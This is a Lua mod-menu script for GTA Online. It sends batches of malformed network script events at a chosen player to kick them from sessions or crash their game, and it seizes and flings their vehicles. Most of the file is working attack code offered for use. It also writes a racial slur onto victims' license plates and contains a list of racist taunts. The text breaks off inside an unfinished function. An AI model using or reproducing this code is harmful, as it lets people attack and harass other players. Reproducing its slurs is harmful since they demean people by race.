require("natives-1614644776")
script = {}
_natives_PLAYER = PLAYER
_natives_NETWORK = NETWORK
_natives_ENTITY = ENTITY
player = {["get_player_ped"] = function(player)
        return _natives_PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player)
    end, ["get_player_coords"] = function(player)
        return _natives_ENTITY.GET_ENTITY_COORDS(_natives_PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player), true)
    end}
local a, b, c, d, e = {}, {}, {}, {}, {}
local f, g, h, i, j, k, l, m, n
local o = filesystem.scripts_dir()
local p, q, r, s, t, u, v, w, x, y, z, A
j = o .. "\\data\\Kicks\\Kicks.data"
k = o .. "\\data\\Kicks\\Kicks2.data"
l = o .. "\\data\\Kicks\\Kicks3.data"
m = o .. "\\data\\Kicks\\Kicks4.data"
n = o .. "\\data\\Kicks\\Kicks6.data"
function dataload()
    if not filesystem.exists(j) then
        return
    end
    for B in io.lines(j) do
        a[#a + 1] = B
    end
end
dataload()
function dataload2()
    if not filesystem.exists(k) then
        return
    end
    for B in io.lines(k) do
        b[#b + 1] = B
    end
end
dataload2()
function dataload3()
    if not filesystem.exists(l) then
        return
    end
    for B in io.lines(l) do
        c[#c + 1] = B
    end
end
dataload3()
function paramload()
    if not filesystem.exists(m) then
        return
    end
    for B in io.lines(m) do
        d[#d + 1] = B
    end
end
paramload()
function dataload6()
    if not filesystem.exists(n) then
        return
    end
    for B in io.lines(n) do
        e[#e + 1] = B
    end
end
dataload6()
local function C(pid)
    local D = math.random
    local E, F = -2147483647, 2147483647
    return {
        pid,
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F)
    }
end
function arg11(pid)
    return 1630317 + 1 + pid * 595 + 506
end
local function G(pid)
    local D = math.random
    local E, F = -2147483647, 2147483647
    return {
        pid,
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F)
    }
end
local function H(pid)
    local D = math.random
    local E, F = -2147483647, 2147483647
    return {
        pid,
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F),
        D(E, F)
    }
end
local I = function()
    return {-1, 623656, 5, 73473741, -7, 856844, -51251, 856844}
end
function v3(J, K, L)
    if J == nil then
        J = 0
    end
    if K == nil then
        K = 0
    end
    if L == nil then
        L = 0
    end
end
function RequestControlOfEnt(M)
    local N = 0
    local O = 0
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(M)
    while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(M) and N <= 1000 do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(M)
        N = N + 1
        O = O + 1
        if O == 50 then
            util.yield()
            O = 0
        end
    end
    return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(M)
end
function get_player_veh(pid, P)
    local Q = PLAYER.GET_PLAYER_PED(pid)
    if PED.IS_PED_IN_ANY_VEHICLE(Q, true) then
        local R = PED.GET_VEHICLE_PED_IS_IN(Q, false)
        if not P then
            return R
        end
        if RequestControlOfEnt(R) then
            return R
        end
    end
    return 0
end
function tp_veh_to(pid, J, K, L)
    local O = 0
    local Q = PLAYER.GET_PLAYER_PED(pid)
    if PED.IS_PED_IN_ANY_VEHICLE(Q, true) then
        local R = get_player_veh(pid, false)
        while O <= 1000 do
            if RequestControlOfEnt(R) then
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(R, J, K, L, 0, 0, 1)
                O = O + 1
            end
        end
    end
end
function marqee(S)
    local T = S
    S = S:sub(2)
    return S .. T:sub(1, 1)
end
function upgrade_vehicle(player)
    local R = get_player_veh(player, true)
    if R then
        DECORATOR.DECOR_SET_INT(R, "MPBitset", 0)
        VEHICLE.SET_VEHICLE_MOD_KIT(R, 0)
        for U = 0, 50 do
            VEHICLE.SET_VEHICLE_MOD(R, U, VEHICLE.GET_NUM_VEHICLE_MODS(R, U) - 1, false)
        end
        VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(R, 0, 0, 0)
        VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(R, 0, 0, 0)
        VEHICLE.TOGGLE_VEHICLE_MOD(R, 22, true)
        VEHICLE._SET_VEHICLE_XENON_LIGHTS_COLOR(R, 10)
        VEHICLE.TOGGLE_VEHICLE_MOD(R, 18, true)
        VEHICLE.TOGGLE_VEHICLE_MOD(R, 20, true)
        for U = 0, 4 do
            if not VEHICLE._IS_VEHICLE_NEON_LIGHT_ENABLED(R, U) then
                VEHICLE._SET_VEHICLE_NEON_LIGHT_ENABLED(R, U, true)
            end
        end
        VEHICLE._SET_VEHICLE_NEON_LIGHTS_COLOUR(R, 255, 0, 255)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(R, "NIGGER")
    end
end
function launch_vehicle(pid)
    local R = get_player_veh(pid, true)
    if R then
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(R, 1, 0, 0, 10000, true, false, true)
    end
end
function northp_vehicle(pid)
    local R = get_player_veh(pid, true)
    if R then
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(R, 1, 0, 10000, 0, true, false, true)
    end
end
function send_script_event(V, W, C)
    table.insert(C, 1, V)
    util.trigger_script_event(1 << W, C)
end
local X = {
    1317868303,
    -1243454584,
    -1212832151,
    1977655521,
    1998625272,
    1070934291,
    -1169499038,
    1101235920,
    -1054826273,
    1620254541,
    1401831542,
    2099816323,
    -1491386500
}
local Y = {
    1317868303,
    -1243454584,
    -1212832151,
    -1252906024,
    -1890951223,
    -442306200,
    -966559987,
    1977655521,
    1998625272,
    1070934291,
    -1169499038,
    -171207973,
    -1559754940,
    1922258436,
    1101235920,
    -1054826273,
    1620254541,
    1401831542,
    2099816323,
    -1491386500
}
local Z = {-977515445, 767605081, -1730227041, -2122716210, -1949011582, -1882923979}
local _ = {
    -977515445,
    -2122716210,
    767605081,
    -1949011582,
    -1882923979,
    -1975590661,
    -922075519,
    1120313136,
    -435067392,
    -171207973,
    -1212832151,
    1317868303,
    -1054826273,
    1620254541,
    1401831542,
    -1491386500,
    -1070934291,
    -1949011582,
    -720040631,
    523402757,
    -1279955769,
    162639435,
    1331862851,
    2086111581,
    860051171,
    -2069242129,
    -1125804155,
    -1495195128,
    94936514,
    -751761218,
    761687265,
    2136412382,
    1456429682,
    1503592133,
    -487923362
}
local a0 = {
    "resolved",
    "ez nigger",
    "ez trash tapped",
    "ez",
    "tapped nigger",
    "ez owned trash",
    "sit nn",
    "1",
    "one",
    "111111111111111",
    "tapped",
    "backtracked to fucking africa",
    "ez shitted nigger"
}
function KickV1(pid, a1)
    for U = 1, a1 do
        for U, a2 in ipairs(X) do
            arg = math.random(461950868, 999999999)
            send_script_event(a2, pid, {pid, arg, arg})
            util.yield()
        end
    end
end
function KickV9(pid, a1)
    for U = 1, a1 do
        for U, a2 in ipairs(Y) do
            arg = math.random(461950868, 999999999)
            send_script_event(a2, pid, {pid, arg, arg})
            util.yield()
        end
    end
end
function Crash(pid)
    for U, a2 in ipairs(Z) do
        par1 = math.random(-100000, 99999999)
        par2 = math.random(-4827432, 3231229)
        par3 = math.random(46190868, 999999999)
        par4 = math.random(-133223, 42746729)
        par5 = math.random(-999999999, 428747628)
        send_script_event(
            767605081,
            pid,
            {pid, 4294894682, -4294904289, -4294908269, 4294955284, 4294940300, -4294933898}
        )
        send_script_event(-2122716210, pid, {pid, 4294967295})
        send_script_event(-2122716210, pid, {pid, par5})
        send_script_event(
            -977515445,
            pid,
            {pid, 4294894682, -4294904289, -4294908269, 4294955284, 4294940300, -4294933898}
        )
        send_script_event(a2, pid, {pid, par1, par2, par3, par4, par5})
        util.yield()
    end
end
function EventArray(pid, a1, a3)
    for U = 1, a1 do
        local a4 = {pid, -1139568479, math.random(0, 4), math.random(0, 1)}
        for U = 5, 13 do
            a4[U] = math.random(-2147483647, 2147483647)
        end
        a4[10] = pid
        send_script_event(a3, pid, a4)
    end
end
function AptSpam(pid)
    for U = 1, #d do
        arg = math.random(-999999999, 428747628)
        send_script_event(-171207973, pid, {arg, pid, -1, 1, -1, 1, 1, 1})
        send_script_event(0xf5cb92db, pid, {24, 24, 1, 0, arg, 1, 1, 1})
        send_script_event(-171207973, pid, {24, 24, 1, 0, arg, 1, 1, 1})
        util.yield()
    end
end
function KickV3(pid, a1)
    for U = 1, a1 do
        send_script_event(0xC120A0DF, pid, {pid, 532165, pid})
        send_script_event(-1882923979, pid, {pid, 532165, pid})
        send_script_event(1949011582, pid, {pid, 532165, pid})
        send_script_event(767605081, pid, {pid, 532165, pid})
        send_script_event(1559754940, pid, {pid, 532165, pid})
        send_script_event(891272013, pid, {pid, 532165, pid})
        send_script_event(1097312011, pid, {pid, 532165, pid})
        send_script_event(0xf5cb92db, pid, {pid, 532165, pid})
        send_script_event(0xF5CB92DB, pid, {pid, 532165, pid})
        send_script_event(-46044922, pid, {pid, 532165, pid})
        send_script_event(-78686524, pid, {pid, 532165, pid})
        send_script_event(56341553, pid, {pid, 532165, pid})
        send_script_event(-80053711, pid, {pid, 532165, pid})
        send_script_event(61749268, pid, {pid, 532165, pid})
        send_script_event(84857178, pid, {pid, 532165, pid})
        send_script_event(-66094971, pid, {pid, 532165, pid})
        send_script_event(-922075519, pid, {pid, 532165, pid})
        send_script_event(-26800537, pid, {pid, 532165, pid})
        send_script_event(-17645264, pid, {pid, 532165, pid})
        send_script_event(-922075519, pid, {pid, 532165, pid})
        send_script_event(-1975590661, pid, {pid, 532165, pid})
        send_script_event(-1882923979, pid, {pid, 532165, pid})
        send_script_event(-1139568479, pid, {pid, 532165, pid})
        send_script_event(-1949011582, pid, {pid, 532165, pid})
        send_script_event(767605081, pid, {pid, 532165, pid})
        send_script_event(-1559754940, pid, {pid, 532165, pid})
        send_script_event(-87967637, pid, {pid, 532165, pid})
        send_script_event(0xf5cb92db, pid, {pid, 532165, pid})
        send_script_event(0xE6116600, pid, {pid, 532165, pid})
        send_script_event(0x8A3EE0FB, pid, {pid, 532165, pid})
        send_script_event(0xC90A3E81, pid, {pid, 532165, pid})
        send_script_event(0x8179EBCE, pid, {pid, 532165, pid})
        send_script_event(1139568479, pid, {pid, 532165, pid})
        send_script_event(0x8BD47182, pid, {pid, 532165, pid})
        send_script_event(0x2DC0B959, pid, {pid, 532165, pid})
        send_script_event(0xC5BC4C4B, pid, {pid, 532165, pid})
        send_script_event(1139568479, pid, {pid, 532165, pid})
        send_script_event(-1949011582, pid, {pid, 532165, pid})
        send_script_event(-922075519, pid, {pid, 532165, pid})
        send_script_event(1139568479, pid, {pid, 532165, pid})
        send_script_event(-1949011582, pid, {pid, 532165, pid})
        send_script_event(767605081, pid, {pid, 532165, pid})
        send_script_event(-977515445, pid, {pid, 532165, pid})
        send_script_event(2122716210, pid, {pid, 532165, pid})
        send_script_event(-171207973, pid, {pid, 532165, pid})
        send_script_event(-435067392, pid, {pid, 532165, pid})
        send_script_event(-1975590661, pid, {pid, 532165, pid})
        send_script_event(-922075519, pid, {pid, 532165, pid})
        send_script_event(1139568479, pid, {pid, 532165, pid})
        send_script_event(767605081, pid, {pid, 532165, pid})
        send_script_event(0xC120A0DF, pid, {pid, 532165, pid})
        send_script_event(-1882923979, pid, {pid, 532165, pid})
        send_script_event(1949011582, pid, {pid, 532165, pid})
        send_script_event(767605081, pid, {pid, 532165, pid})
        send_script_event(1559754940, pid, {pid, 532165, pid})
        send_script_event(891272013, pid, {pid, 532165, pid})
        send_script_event(1097312011, pid, {pid, 532165, pid})
        send_script_event(0xf5cb92db, pid, {pid, 532165, pid})
        send_script_event(0xF5CB92DB, pid, {pid, 532165, pid})
        send_script_event(-46044922, pid, {pid, 532165, pid})
        send_script_event(-78686524, pid, {pid, 532165, pid})
        send_script_event(56341553, pid, {pid, 532165, pid})
        send_script_event(-80053711, pid, {pid, 532165, pid})
        send_script_event(61749268, pid, {pid, 532165, pid})
        send_script_event(84857178, pid, {pid, 532165, pid})
        send_script_event(-66094971, pid, {pid, 532165, pid})
        send_script_event(-922075519, pid, {pid, 532165, pid})
        send_script_event(-26800537, pid, {pid, 532165, pid})
        send_script_event(-17645264, pid, {pid, 532165, pid})
        send_script_event(-922075519, pid, {pid, 532165, pid})
        send_script_event(-1975590661, pid, {pid, 532165, pid})
        send_script_event(-1882923979, pid, {pid, 532165, pid})
        send_script_event(-1139568479, pid, {pid, 532165, pid})
        send_script_event(-1949011582, pid, {pid, 532165, pid})
        send_script_event(767605081, pid, {pid, 532165, pid})
        send_script_event(-1559754940, pid, {pid, 532165, pid})
        send_script_event(-87967637, pid, {pid, 532165, pid})
        send_script_event(0xf5cb92db, pid, {pid, 532165, pid})
        send_script_event(0xE6116600, pid, {pid, 532165, pid})
        send_script_event(0x8A3EE0FB, pid, {pid, 532165, pid})
        send_script_event(0xC90A3E81, pid, {pid, 532165, pid})
        send_script_event(0x8179EBCE, pid, {pid, 532165, pid})
        send_script_event(1139568479, pid, {pid, 532165, pid})
        send_script_event(0x8BD47182, pid, {pid, 532165, pid})
        send_script_event(0x2DC0B959, pid, {pid, 532165, pid})
        send_script_event(0xC5BC4C4B, pid, {pid, 532165, pid})
        send_script_event(1139568479, pid, {pid, 532165, pid})
        send_script_event(-1949011582, pid, {pid, 532165, pid})
        send_script_event(-922075519, pid, {pid, 532165, pid})
        send_script_event(1139568479, pid, {pid, 532165, pid})
        send_script_event(-1949011582, pid, {pid, 532165, pid})
        send_script_event(767605081, pid, {pid, 532165, pid})
        send_script_event(-977515445, pid, {pid, 532165, pid})
        send_script_event(2122716210, pid, {pid, 532165, pid})
        send_script_event(-171207973, pid, {pid, 532165, pid})
        send_script_event(-435067392, pid, {pid, 532165, pid})
        send_script_event(-1975590661, pid, {pid, 532165, pid})
        send_script_event(-922075519, pid, {pid, 532165, pid})
        send_script_event(1139568479, pid, {pid, 532165, pid})
        send_script_event(767605081, pid, {pid, 532165, pid})
        send_script_event(2122716210, pid, {pid, 532165, pid})
        send_script_event(0xC5BC4C4B, pid, {pid, 532165, pid})
        send_script_event(-2122716210, pid, {pid, 532165, pid})
        send_script_event(0x8BD47182, pid, {pid, 532165, pid})
        send_script_event(-1949011582, pid, {pid, 532165, pid})
        send_script_event(-1139568479, pid, {pid, 532165, pid})
        send_script_event(-1139568479, pid, {pid, 532165, pid})
        send_script_event(0xC5BC4C4B, pid, {pid, 532165, pid})
        send_script_event(-922075519, pid, {pid, 532165, pid})
        send_script_event(1975590661, pid, {pid, 532165, pid})
        send_script_event(-1139568479, pid, {pid, 532165, pid})
        send_script_event(767605081, pid, {pid, 532165, pid})
        send_script_event(-2122716210, pid, {pid, 532165, pid})
        send_script_event(-1949011582, pid, {pid, 532165, pid})
        send_script_event(922075519, pid, {pid, 532165, pid})
        send_script_event(1975590661, pid, {pid, 532165, pid})
        send_script_event(1882923979, pid, {pid, 532165, pid})
        send_script_event(1139568479, pid, {pid, 532165, pid})
        send_script_event(1949011582, pid, {pid, 532165, pid})
        send_script_event(0xC5BC4C4B, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0x2DC0B959, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0x8BD47182, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1139568479, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0x8179EBCE, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0xC90A3E81, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0x8A3EE0FB, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-2122716210, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(767605081, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(2122716210, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(977515445, pid, {pid, 532165, pid})
        send_script_event(-977515445, pid, {pid, 532165, pid})
        send_script_event(767605081, pid, {pid, 532165, pid})
        send_script_event(-1730227041, pid, {pid, 532165, pid})
        send_script_event(-435067392, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(526625102, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1347850743, pid, {pid, 532165, pid})
        send_script_event(-1212832151, pid, {pid, 532165, pid})
        send_script_event(1428412924, pid, {pid, 532165, pid})
        send_script_event(-435067392, pid, {pid, 532165, pid})
        send_script_event(-799924696, pid, {pid, 532165, pid})
        send_script_event(1428412924, pid, {pid, 532165, pid})
        send_script_event(2646045593, pid, {-1, 0, -1, 0})
        send_script_event(1347850743, pid, {-1, 0, -1, 0})
        send_script_event(-2122716210, pid, {91645, -99683, 1788, 60877, 55085, 72028})
